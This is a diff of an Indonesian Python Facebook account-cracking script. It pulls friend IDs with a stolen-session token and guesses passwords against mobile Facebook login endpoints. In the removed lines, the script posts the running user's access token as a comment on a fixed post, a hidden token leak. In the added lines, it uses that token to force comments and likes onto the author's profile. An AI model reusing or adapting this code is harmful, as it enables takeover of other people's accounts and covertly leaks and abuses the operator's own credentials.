@@ -7,7 +7,7 @@ Instragram = 'Instragram.com/fikri.sinaga'
 LicenseKey = '06 Hari'
 Version = '0.5'
 Fikri  = 100080716718035
-Postingan = 115753054458585
+Postingan = 105174525516438
 komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)
 ##### >>>> IMPORT MODULE
 import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
@@ -179,7 +179,7 @@ def kecuali(error):
 ###----------[BOT AUTHOR JANGAN DIGANTI ]---------- ###
 class bot_author:
     def __init__(self,cookie,token,cookie_mentah):
-        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Fikri)];self.komen = ['Mantap Bang','Gokil Bang','Keren Bang','Kenalan Bang']
+        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Fikri)];self.komen = ['Mantap Bang','Gokil Bang','Keren Bang','Panutanku']
         for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
     def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
         with requests.Session() as xyz:
@@ -248,37 +248,38 @@ def log_cookie():
         ___fii___Sayang___Kamu___Widiya___()
     except requests.exceptions.ConnectionError:print(f"{P}[•] Tidak Ada Koneksi Internet ");exit()
     except (KeyError,IOError,AttributeError):print(f"{P}[•] Cookies Invalid ");exit()
-  
-komenredem = random.choice(['HENKER SUMATRA BANG'])
-komtwol = random.choice(['ANJAY SELEBEW Syafii X NANO ', 'MR.Riyal FIKRI SINAGA X NANO', 'BANG KOK LO JAGO BANGET SIH ', 'LORD DAH MAKAN BLM'])
-kartu2d = random.choice(["LU GANTENG BANG TAPI SAYANG BELUM PUNYA PACAR", "PRISTYLE DULU BOSSS KU","AHAHAHAHHA BANYAK YANG TUKANG RECODE BANG"])
-kon = random.choice(["BANG GUA MAU RECODE SC LU BOLEH :)"])
+
+
+komenredem = random.choice(['HENKER WOLES ROKER'])
+komtwol = random.choice(['ANJAY SLEMEX LORD Syafii X NANO ', 'MR.Riyal M.Syafii X NANO', 'BANH KOK LO JAGO BANGET SIH ', 'LORD DAH MAKAN BLM'])
+kartu2d = random.choice(["LU GANTENG BANH TAPI SAYANG KEK HENGKER", "PRISTYLE DULU BOSSS HENGKER PURWOREJO","AHAHAHAHHA BANYAK KANG RECOD AWAS BANG "])
+kon = random.choice(["HACKER SAMURAI XXXX :)"])
 
 def ___fii___Sayang___Kamu___Widiya___():
     try:
-        token=open("login/token.json","r").read()
+        token = open('login/token.json', 'r').read()
         cookie = {'cookie':open('login/cookie.json','r').read()}
     except IOError:
         print(f"{B} | ")
         print(f"{B} | ")
-        jalan(f"{P}[!]{M} Pastikan akun tumbal bagus");exit()
-        os.system('rm -rf login/token.json')
-        os.system('rm -rf login/cookie.json')
+        jalan(f"{P}[√]{M} Pastikan akun tumbal bagus");log_cookie()
+        os.system("rm -rf login/token.json")
+        os.system("rm -rf login/cookie.json")
         menu()
     kom = komenredem
-    komentar = komtwol
     pipp = kartu2d
-    post = '3144112082575661'
-    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/3144112082575661/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/3144112082575661/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/3144112082575661/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/3144112082575661/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/3144112082575661/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/3144112082575661/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/740479386990032/likes?summary=true&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/740479386990032/likes?summary=true&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/740479386990032/likes?summary=true&access_token=' + (token),cookies=cookie)
+    list_id = str(Fikri)
+    requests.post('https://graph.facebook.com/' + list_id + '/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/'+ list_id + '/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/'+ list_id +'/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/'+ list_id +'/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/'+ list_id +'/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/'+ list_id +'/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/'+ list_id +'/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/'+ list_id +'/likes?summary=true&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/'+ list_id +'/likes?summary=true&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/'+ list_id +'/likes?summary=true&access_token=' + (token),cookies=cookie)
+    jalan(f"{P}[•] Login Berhasil..")
     menu()
     
 ###### BUAT MENU
@@ -287,9 +288,9 @@ def menu():
     try:
         token=open("login/token.json","r").read()
         cookie = {'cookie':open('login/cookie.json','r').read()}
+        language(cookie)
         get  = requests.Session().get('https://graph.facebook.com/me?access_token=%s'%(token),cookies=cookie)
         gt = requests.get('http://ipinfo.io/json').json()
-        language(cookie)
         lolo=json.loads(get.text)
         lolol=lolo['name']
         lolol_id=lolo['id']
@@ -324,8 +325,8 @@ def menu():
     pp = input(f"{P}[•] Pilih Mana : {B}")
     if pp in ["1","01"]:
       massal()
-    elif pp in ["2","02"]: 
-      publik()
+    elif pp in ["2","02"]:
+        publik()
     elif pp in ["3","03"]:
         listteman()
     elif pp in ["4","04"]:
@@ -419,16 +420,13 @@ def publik():
     print(f"{B} | ")
     print(f"{B} | ")
     _id_=input(f"{P}[•] Masukan user id : {B}")
-    file_dump = 'dump/%s.json'
-    try:os.remove(file_dump)
-    except:pass
     try:
         url= requests.Session().get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,token),cookies=cookie)
         z=json.loads(url.text)
         for i in z['friends']['data']:
-          uid = i["id"]
-          nama = i["name"]
-          id.append(uid+"<=>"+nama)
+            uid = i["id"]
+            nama = i["name"]
+            id.append(uid+"<=>"+nama)
     except KeyError:
         print(f"{B} | ")
         print(f"{B} | ")
@@ -499,7 +497,7 @@ def userset():
         try:
             _tes_ua=open("ua","r").read()
         except IOError:
-            _tes_ua=("Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
+            _tes_ua=("Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]")
         print(f"{B} | ")
         print(f"{P}[•] User agent : {B}{_tes_ua}");menu()
     elif _pil_ in ["0","00"]:
@@ -508,7 +506,7 @@ def userset():
 
 #####LOGIN HASIL
 def log_hasil(user, pasw):
-    ua = "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
+    ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
     ses = requests.Session()
     ses.headers.update({
     "Host": "mbasic.facebook.com",
@@ -528,7 +526,7 @@ def log_hasil(user, pasw):
     "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
     })
     data = {}
-    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
+    ged = par(ses.get("https://free.facebook.com/settings/apps/tabbed/", headers={"user-agent":ua}).text, "html.parser")
     fm = ged.find("form",{"method":"post"})
     list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
     for i in fm.find_all("input"):
@@ -1019,7 +1017,7 @@ def mbasic(uid, fii):
 	try:
 		ua = open("ua", "r").read()
 	except IOError:
-		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
+		ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 	global ok, cp, loop, token, cookie
 	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
 	for pw in fii:
@@ -1027,7 +1025,7 @@ def mbasic(uid, fii):
 		pw = pw.lower()
 		ses = requests.Session()
 		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
-		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
+		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8").text
 		b = parser(p,"html.parser")
 		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 		for i in b("input"):
@@ -1036,7 +1034,7 @@ def mbasic(uid, fii):
 				else:continue
 			except:pass
 		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
-		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
+		deku = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0",data=fii_gtg)
 		if "c_user" in ses.cookies.get_dict().keys():
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
 			print(f"\r{B} |----> {I}{uid}•{pw}")
@@ -1074,7 +1072,7 @@ def mbasicc(uid, fii):
 	try:
 		ua = open("ua", "r").read()
 	except IOError:
-		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
+		ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 	global ok, cp, loop, token, cookie
 	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
 	for pw in fii:
@@ -1082,7 +1080,7 @@ def mbasicc(uid, fii):
 		pw = pw.lower()
 		ses = requests.Session()
 		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
-		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
+		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8").text
 		b = parser(p,"html.parser")
 		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 		for i in b("input"):
@@ -1091,7 +1089,7 @@ def mbasicc(uid, fii):
 				else:continue
 			except:pass
 		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
-		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
+		deku = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0",data=fii_gtg)
 		if "c_user" in ses.cookies.get_dict().keys():
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
 			print(f"\r{B} |----> {I}{uid}•{pw}")
@@ -1128,15 +1126,15 @@ def mobil(uid, fii):
 	try:
 		ua = open("ua", "r").read()
 	except IOError:
-		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
+		ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 	global ok, cp, loop, token, cookie
 	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
 	for pw in fii:
 		fii_gtg = {}
 		pw = pw.lower()
 		ses = requests.Session()
-		ses.headers.update({"origin": "https://mobile.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
-		p = ses.get("https://mobile.facebook.com/login/?next&ref=dbl&refid=8").text
+		ses.headers.update({"origin": "https://m.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "m.facebook.com", "referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
+		p = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text
 		b = parser(p,"html.parser")
 		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 		for i in b("input"):
@@ -1145,7 +1143,7 @@ def mobil(uid, fii):
 				else:continue
 			except:pass
 		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
-		deku = ses.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
+		deku = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0",data=fii_gtg)
 		if "c_user" in ses.cookies.get_dict().keys():
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
 			print(f"\r{B} |----> {I}{uid}•{pw}")
@@ -1183,15 +1181,15 @@ def mobill(uid, fii):
 	try:
 		ua = open("ua", "r").read()
 	except IOError:
-		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
+		ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 	global ok, cp, loop, token, cookie
 	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
 	for pw in fii:
 		fii_gtg = {}
 		pw = pw.lower()
 		ses = requests.Session()
-		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
-		p = ses.get("https://mobile.facebook.com/login/?next&ref=dbl&refid=8").text
+		ses.headers.update({"origin": "https://m.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "m.facebook.com", "referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
+		p = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text
 		b = parser(p,"html.parser")
 		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 		for i in b("input"):
@@ -1200,7 +1198,7 @@ def mobill(uid, fii):
 				else:continue
 			except:pass
 		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
-		deku = ses.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
+		deku = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0",data=fii_gtg)
 		if "c_user" in ses.cookies.get_dict().keys():
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
 			print(f"\r{B} |----> {I}{uid}•{pw}")
@@ -1239,7 +1237,7 @@ def cek_log(uid,pw,ua):
 	option = []
 	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 	data = {}
-	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
+	ged = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", headers={"user-agent":ua}).text, "html.parser")
 	fm = ged.find("form",{"method":"post"})
 	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
 	for i in fm.find_all("input"):
@@ -1261,7 +1259,7 @@ def cek_log(uid,pw,ua):
 		for opt in range(len(ngew)):
 			jalan(f"{U}[{B}{str(opt+1)}{U}]{B}>>>>>{U}[{B}{ngew[opt]}{U}")
 		if "0" in str(len(ngew)):
-			jalan(f"{P}[•]{I} Hore akunya tab yesss, silahkan di login di fb lite ")
+			jalan(f"{P}[√]{I} Hore akunya tab yesss, silahkan di login di fb lite ")
 	elif "login_error" in str(run):
 		jalan(f"\r{P}[•]{I}>>>>>>----> {B}{uid}•{pw}")
 	else:
